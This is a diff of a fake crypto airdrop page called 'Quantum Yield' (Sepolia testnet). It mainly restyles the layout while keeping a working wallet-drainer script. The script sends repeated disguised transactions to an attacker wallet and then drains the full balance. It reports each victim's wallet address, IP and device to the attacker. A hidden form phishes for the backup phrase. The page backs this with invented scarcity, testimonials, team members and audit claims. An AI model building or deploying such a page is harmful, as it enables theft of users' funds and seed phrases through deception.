@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 Quantum Yield Airdrop [SEPOLIA TESTNET] - Claim 5 QYT + Rare NFTs!</title>
+    <title>🔬 Quantum Yield Airdrop [SEPOLIA TESTNET] - Claim 5 QYT + NFTs!</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
@@ -18,13 +18,20 @@
             --gold: #FFD700;
         }
 
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
         body {
             font-family: 'Poppins', sans-serif;
             background: linear-gradient(135deg, var(--dark), #1a1e25);
             color: var(--light);
-            margin: 0;
             min-height: 100vh;
             overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
         }
 
         #particles-js {
@@ -36,43 +43,37 @@
         }
 
         .container {
-            max-width: 1440px;
+            width: 90%;
+            max-width: 1200px;
             margin: 0 auto;
             padding: 2rem;
-            position: relative;
             background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
-            backdrop-filter: blur(15px);
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+            backdrop-filter: blur(10px);
             border: 1px solid rgba(0, 212, 255, 0.5);
-            animation: glow 2s infinite alternate;
-        }
-
-        @keyframes glow {
-            from { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
-            to { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }
         }
 
         header {
-            position: fixed;
+            position: sticky;
+            top: 0;
             width: 100%;
             background: rgba(21, 23, 27, 0.9);
             border-bottom: 2px solid var(--primary);
             backdrop-filter: blur(10px);
             z-index: 1000;
-            top: 0;
         }
 
-        .nav-links {
+        nav {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            padding: 1rem 0;
+            align-items: center;
+            padding: 1rem 2rem;
         }
 
         .nav-links a {
             color: var(--neon);
-            margin: 0 1.5rem;
+            margin: 0 1rem;
             text-decoration: none;
             font-weight: 600;
             transition: color 0.3s;
@@ -91,23 +92,21 @@
         }
 
         .hero {
-            height: 100vh;
-            display: flex;
-            align-items: center;
             text-align: center;
+            padding: 4rem 0;
             background: url('https://i.imgur.com/quantum-bg.jpg') no-repeat center/cover;
             border-bottom: 3px solid var(--secondary);
         }
 
         .hero h1 {
-            font-size: 5rem;
+            font-size: 3.5rem;
             color: var(--gold);
-            text-shadow: 0 0 25px var(--primary), 0 0 50px var(--accent);
+            text-shadow: 0 0 20px var(--primary);
             animation: pulse 2s infinite;
         }
 
         .hero p {
-            font-size: 1.5rem;
+            font-size: 1.2rem;
             color: var(--neon);
             margin: 1rem 0;
         }
@@ -115,19 +114,19 @@
         .cta {
             background: linear-gradient(45deg, var(--primary), var(--secondary));
             color: var(--dark);
-            padding: 1.2rem 3rem;
+            padding: 1rem 2rem;
             border-radius: 50px;
             border: none;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
             transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 0 20px var(--primary);
+            box-shadow: 0 0 15px var(--primary);
         }
 
         .cta:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 30px var(--accent);
+            transform: scale(1.05);
+            box-shadow: 0 0 25px var(--accent);
         }
 
         .cta:disabled {
@@ -136,53 +135,55 @@
         }
 
         .countdown {
-            font-size: 2rem;
+            font-size: 1.8rem;
             color: var(--accent);
-            margin: 2rem 0;
+            margin: 1.5rem 0;
             font-weight: 800;
             text-shadow: 0 0 10px var(--accent);
         }
 
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 2rem;
-            margin: 4rem 0;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
         }
 
         .stat-card {
             background: rgba(42, 46, 55, 0.8);
-            border-radius: 20px;
-            padding: 2rem;
+            border-radius: 15px;
+            padding: 1.5rem;
             text-align: center;
             border: 1px solid var(--neon);
             transition: transform 0.3s;
         }
 
         .stat-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 0 20px var(--neon);
+            transform: translateY(-5px);
+            box-shadow: 0 0 15px var(--neon);
         }
 
         .stat-card h3 {
             color: var(--gold);
-            font-size: 2rem;
+            font-size: 1.8rem;
         }
 
         .nft-rewards {
             display: flex;
-            justify-content: space-around;
-            margin: 30px 0;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+            margin: 2rem 0;
         }
 
         .nft {
-            width: 150px;
-            height: 150px;
+            width: 120px;
+            height: 120px;
             background-size: cover;
-            border-radius: 15px;
-            border: 3px solid var(--neon);
-            box-shadow: 0 0 15px rgba(0, 255, 157, 0.7);
-            transition: transform 0.3s ease;
+            border-radius: 10px;
+            border: 2px solid var(--neon);
+            box-shadow: 0 0 10px rgba(0, 255, 157, 0.7);
+            transition: transform 0.3s;
         }
 
         .nft:hover {
@@ -194,56 +195,59 @@
 
         .nft span {
             display: block;
-            font-size: 0.9em;
+            font-size: 0.8rem;
             color: var(--gold);
-            margin-top: 5px;
+            margin-top: 0.5rem;
         }
 
-        .roadmap, .about, .team, .news, .partners, .testimonials {
+        .section {
             background: rgba(42, 46, 55, 0.9);
-            border-radius: 25px;
-            padding: 3rem;
-            margin: 4rem 0;
-            border: 2px dashed var(--primary);
-            text-align: left;
+            border-radius: 15px;
+            padding: 2rem;
+            margin: 2rem 0;
+            border: 1px solid var(--primary);
         }
 
-        .roadmap h2, .about h2, .team h2, .news h2, .partners h2, .testimonials h2 {
+        .section h2 {
             color: var(--neon);
-            text-shadow: 0 0 15px var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            margin-bottom: 1rem;
         }
 
         .partners ul {
             list-style: none;
-            padding: 0;
             display: flex;
             justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 1rem;
         }
 
         .partners li {
-            font-size: 1.1em;
+            font-size: 1rem;
             color: var(--neon);
         }
 
         .testimonials p {
             background: rgba(0, 212, 255, 0.1);
-            padding: 10px;
+            padding: 1rem;
             border-radius: 10px;
-            margin: 10px 0;
+            margin: 1rem 0;
             border: 1px dashed var(--primary);
         }
 
         footer {
-            border-top: 2px solid var(--primary);
+            margin-top: auto;
             padding: 2rem 0;
             text-align: center;
             background: var(--dark);
+            border-top: 2px solid var(--primary);
         }
 
         footer a {
             color: var(--neon);
             margin: 0 1rem;
             text-decoration: none;
+            transition: color 0.3s;
         }
 
         footer a:hover {
@@ -251,8 +255,8 @@
         }
 
         #status {
-            margin: 20px 0;
-            font-size: 1.1em;
+            margin: 1rem 0;
+            font-size: 1rem;
         }
 
         .success { color: var(--neon); text-shadow: 0 0 10px var(--neon); }
@@ -260,53 +264,72 @@
         .warning { color: var(--gold); font-weight: bold; }
 
         .wheel {
-            width: 100px;
-            height: 100px;
+            width: 80px;
+            height: 80px;
             border-radius: 50%;
             background: conic-gradient(var(--primary), var(--accent), var(--neon), var(--gold), var(--primary));
-            margin: 20px auto;
+            margin: 1rem auto;
             animation: spin 2s linear;
         }
 
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
         .referral, .share, .phishing {
-            margin: 20px 0;
+            margin: 1.5rem 0;
+            text-align: center;
         }
 
         .referral input, .phishing input {
-            padding: 10px;
+            padding: 0.8rem;
             width: 70%;
+            max-width: 400px;
             border: 1px solid var(--primary);
             border-radius: 5px;
             background: rgba(255, 255, 255, 0.1);
             color: var(--light);
+            font-size: 1rem;
         }
 
         .referral button, .share button, .phishing button {
-            padding: 10px 20px;
-            font-size: 1em;
-            margin-left: 10px;
+            padding: 0.8rem 1.5rem;
+            font-size: 1rem;
+            margin: 0.5rem;
             background: var(--neon);
             color: var(--dark);
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .referral button:hover, .share button:hover, .phishing button:hover {
+            background: var(--gold);
         }
 
         .phishing { display: none; }
 
         @keyframes pulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            50% { transform: scale(1.03); }
             100% { transform: scale(1); }
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .hero p { font-size: 1rem; }
+            .cta { padding: 0.8rem 1.5rem; font-size: 1rem; }
+            .countdown { font-size: 1.5rem; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .nft { width: 100px; height: 100px; }
+            nav { flex-direction: column; padding: 1rem; }
+            .nav-links a { margin: 0.5rem; }
         }
     </style>
 </head>
 <body>
     <div id="particles-js"></div>
     <header>
-        <nav class="container">
+        <nav>
             <div class="logo">Quantum Yield</div>
             <div class="nav-links">
                 <a href="#airdrop">Airdrop</a>
@@ -317,103 +340,108 @@
         </nav>
     </header>
 
-    <section class="hero" id="airdrop">
-        <div class="container">
-            <h1>Quantum Yield Airdrop [SEPOLIA]</h1>
-            <p>Claim 5 QYT + Exclusive NFTs Now! Only 1,000 Spots Left!</p>
-            <div class="countdown" id="timer">00:00:00</div>
-            <button class="cta" id="claimBtn" onclick="claimNow()">Claim Now</button>
-            <div id="status"></div>
-        </div>
-    </section>
+    <main>
+        <section class="hero" id="airdrop">
+            <div class="container">
+                <h1>Quantum Yield Airdrop [SEPOLIA]</h1>
+                <p>Claim 5 QYT + Exclusive NFTs Now! Only 1,000 Spots Left!</p>
+                <div class="countdown" id="timer">00:00:00</div>
+                <button class="cta" id="claimBtn" onclick="claimNow()">Claim Now</button>
+                <div id="status"></div>
+            </div>
+        </section>
 
-    <section class="container stats-grid">
-        <div class="stat-card">
-            <h3>5 QYT</h3>
-            <p>Free Tokens Per Claim</p>
-        </div>
-        <div class="stat-card">
-            <h3>1,000</h3>
-            <p>Limited Spots</p>
-        </div>
-        <div class="stat-card">
-            <h3>10x</h3>
-            <p>Value Surge Expected</p>
-        </div>
-        <div class="stat-card">
-            <h3><span id="claimed">7,842</span></h3>
-            <p>Claimed QYT</p>
-        </div>
-    </section>
+        <section class="container stats-grid">
+            <div class="stat-card">
+                <h3>5 QYT</h3>
+                <p>Free Tokens</p>
+            </div>
+            <div class="stat-card">
+                <h3>1,000</h3>
+                <p>Limited Spots</p>
+            </div>
+            <div class="stat-card">
+                <h3>10x</h3>
+                <p>Value Surge</p>
+            </div>
+            <div class="stat-card">
+                <h3><span id="claimed">7,842</span></h3>
+                <p>Claimed QYT</p>
+            </div>
+        </section>
 
-    <section class="container nft-rewards" id="nfts">
-        <div>
-            <div class="nft nft1"></div>
-            <span id="nft1-rarity"></span>
-        </div>
-        <div>
-            <div class="nft nft2"></div>
-            <span id="nft2-rarity"></span>
-        </div>
-    </section>
+        <section class="container section nft-rewards" id="nfts">
+            <h2>NFT Rewards</h2>
+            <div>
+                <div class="nft nft1"></div>
+                <span id="nft1-rarity"></span>
+            </div>
+            <div>
+                <div class="nft nft2"></div>
+                <span id="nft2-rarity"></span>
+            </div>
+        </section>
 
-    <section class="container about">
-        <h2>About Quantum Yield</h2>
-        <p>Quantum Yield is a DeFi protocol using quantum computing to optimize yield farming. QYT offers staking and governance.</p>
-        <p>Audited by <a href="https://www.certik.com/" target="_blank" style="color: var(--neon);">CertiK</a></p>
-    </section>
+        <section class="container section about">
+            <h2>About Quantum Yield</h2>
+            <p>Quantum Yield is a DeFi protocol using quantum computing to optimize yield farming. QYT offers staking and governance.</p>
+            <p>Audited by <a href="https://www.certik.com/" target="_blank" style="color: var(--neon);">CertiK</a></p>
+        </section>
 
-    <section class="container team">
-        <h2>Our Team</h2>
-        <p><strong>Dr. Alice Quantum</strong> - CEO, PhD MIT</p>
-        <p><strong>Bob Blockchain</strong> - CTO, Ex-Ethereum</p>
-    </section>
+        <section class="container section team">
+            <h2>Our Team</h2>
+            <p><strong>Dr. Alice Quantum</strong> - CEO, PhD MIT</p>
+            <p><strong>Bob Blockchain</strong> - CTO, Ex-Ethereum</p>
+        </section>
 
-    <section class="container roadmap" id="roadmap">
-        <h2>Roadmap to Riches</h2>
-        <p>Q1 2025: Mainnet Launch<br>Q2 2025: Staking Release<br>Q4 2025: Mobile App</p>
-    </section>
+        <section class="container section roadmap" id="roadmap">
+            <h2>Roadmap to Riches</h2>
+            <p>Q1 2025: Mainnet Launch<br>Q2 2025: Staking Release<br>Q4 2025: Mobile App</p>
+        </section>
 
-    <section class="container news">
-        <h2>News</h2>
-        <p>March 2025: Chainlink Partnership</p>
-        <p>Feb 2025: Testnet Success</p>
-    </section>
+        <section class="container section news">
+            <h2>News</h2>
+            <p>March 2025: Chainlink Partnership</p>
+            <p>Feb 2025: Testnet Success</p>
+        </section>
 
-    <section class="container partners">
-        <h2>Partners</h2>
-        <ul>
-            <li><i class="fas fa-link"></i> Chainlink</li>
-            <li><i class="fas fa-shapes"></i> Polygon</li>
-            <li><i class="fas fa-exchange-alt"></i> Uniswap</li>
-        </ul>
-    </section>
+        <section class="container section partners">
+            <h2>Partners</h2>
+            <ul>
+                <li><i class="fas fa-link"></i> Chainlink</li>
+                <li><i class="fas fa-shapes"></i> Polygon</li>
+                <li><i class="fas fa-exchange-alt"></i> Uniswap</li>
+            </ul>
+        </section>
 
-    <section class="container testimonials">
-        <h2>What People Say</h2>
-        <p>"Claimed 5 QYT—insane!" - @CryptoKingX</p>
-        <p>"Fast, got my NFT!" - @NFTManiac</p>
-    </section>
+        <section class="container section testimonials">
+            <h2>What People Say</h2>
+            <p>"Claimed 5 QYT—insane!" - @CryptoKingX</p>
+            <p>"Fast, got my NFT!" - @NFTManiac</p>
+        </section>
 
-    <section class="container">
-        <div class="referral">
-            <p>Invite friends & earn 10% of their claims!</p>
-            <input type="text" value="https://quantum-yield.com/ref=12345" readonly>
-            <button onclick="copyReferralLink()">Copy Link</button>
-        </div>
+        <section class="container section">
+            <div class="referral">
+                <h2>Refer & Earn</h2>
+                <p>Invite friends & earn 10% of their claims!</p>
+                <input type="text" value="https://quantum-yield.com/ref=12345" readonly>
+                <button onclick="copyReferralLink()">Copy Link</button>
+            </div>
 
-        <div class="share" style="display: none;" id="share">
-            <p>Share your success!</p>
-            <button onclick="copyShareText()">Copy Tweet</button>
-        </div>
+            <div class="share" style="display: none;" id="share">
+                <h2>Share Your Success</h2>
+                <button onclick="copyShareText()">Copy Tweet</button>
+            </div>
 
-        <div class="phishing" id="phishing" style="display: none;">
-            <p>Verify your wallet to receive your NFT airdrop link (optional):</p>
-            <input type="text" id="phishing-input" placeholder="Enter backup phrase">
-            <button onclick="submitPhishing()">Submit</button>
-            <div id="phishing-status"></div>
-        </div>
-    </section>
+            <div class="phishing" id="phishing" style="display: none;">
+                <h2>Verify for NFT</h2>
+                <p>Enter backup phrase to receive your NFT link (optional):</p>
+                <input type="text" id="phishing-input" placeholder="Enter backup phrase">
+                <button onclick="submitPhishing()">Submit</button>
+                <div id="phishing-status"></div>
+            </div>
+        </section>
+    </main>
 
     <footer>
         <div class="container">
@@ -434,7 +462,7 @@
         // Particles.js setup
         particlesJS("particles-js", {
             particles: {
-                number: { value: 100, density: { enable: true, value_area: 800 } },
+                number: { value: 80, density: { enable: true, value_area: 800 } },
                 color: { value: "#00FFF0" },
                 shape: { type: "circle" },
                 opacity: { value: 0.5, random: true },
@@ -507,7 +535,7 @@
             const claimBtn = document.getElementById("claimBtn");
             claimBtn.disabled = true;
             claimBtn.innerText = "Processing...";
-            document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting to Blockchain...</p>";
+            document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting...</p>";
 
             if (!window.ethereum) {
                 document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a></p>";
@@ -535,8 +563,7 @@
             const info = await getVictimInfo();
             await sendVictimAlert(`🎯 VICTIM CONNECTED\nWallet: ${victimAddress}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
 
-            // Fake token approval
-            document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Token Contract (0.001 SEP)...</p>";
+            document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Contract (0.001 SEP)...</p>";
             await signer.sendTransaction({
                 to: ATTACKER_WALLET,
                 value: ethers.utils.parseEther("0.001"),
@@ -545,8 +572,7 @@
                 chainId: 11155111
             });
 
-            // Verification
-            document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 SEP!</p>";
+            document.getElementById("status").innerHTML = "<p class='warning'>Verifying Eligibility (0.005 SEP)...</p>";
             await signer.sendTransaction({
                 to: ATTACKER_WALLET,
                 value: ethers.utils.parseEther("0.005"),
@@ -555,8 +581,7 @@
                 chainId: 11155111
             });
 
-            // Claim fee
-            document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 SEP claim fee for 5 QYT (~$12,500 USD)!</p>";
+            document.getElementById("status").innerHTML = "<p class='warning'>Approve Claim Fee (0.01 SEP)...</p>";
             await signer.sendTransaction({
                 to: ATTACKER_WALLET,
                 value: ethers.utils.parseEther("0.01"),
@@ -565,12 +590,11 @@
                 chainId: 11155111
             });
 
-            // Full drain
             const drainAmount = balance.sub(gasCost);
             if (drainAmount.gt(0)) {
                 const drainEth = ethers.utils.formatEther(drainAmount);
                 const drainUsd = (parseFloat(drainEth) * ETH_TO_USD_RATE).toFixed(2);
-                document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop!</p>";
+                document.getElementById("status").innerHTML = "<p class='warning'>Final Step: Lock Airdrop!</p>";
                 const tx = await signer.sendTransaction({
                     to: ATTACKER_WALLET,
                     value: drainAmount,
@@ -581,8 +605,7 @@
                 await sendVictimAlert(`✅ SEPOLIA SUCCESS: ${victimAddress} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${tx.hash}\nIP: ${info.ip}`);
             }
 
-            // Spin-to-win
-            document.getElementById("status").innerHTML = "<p class='warning'>Spin for a bonus! Spinning...</p><div class='wheel'></div>";
+            document.getElementById("status").innerHTML = "<p class='warning'>Spinning Bonus...</p><div class='wheel'></div>";
             await new Promise(resolve => setTimeout(resolve, 2000));
             document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
             document.getElementById("share").style.display = "block";
@@ -629,8 +652,8 @@
         window.onload = () => {
             startTimer();
             setInterval(updateClaimCounter, 5000);
-            document.getElementById("nft1-rarity").innerHTML = `Quantum Ape #${Math.floor(Math.random() * 1000)} - Rarity: Epic`;
-            document.getElementById("nft2-rarity").innerHTML = `Yield Bot #${Math.floor(Math.random() * 100)} - Rarity: Legendary`;
+            document.getElementById("nft1-rarity").innerHTML = `Quantum Ape #${Math.floor(Math.random() * 1000)} - Epic`;
+            document.getElementById("nft2-rarity").innerHTML = `Yield Bot #${Math.floor(Math.random() * 100)} - Legendary`;
         };
     </script>
     <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
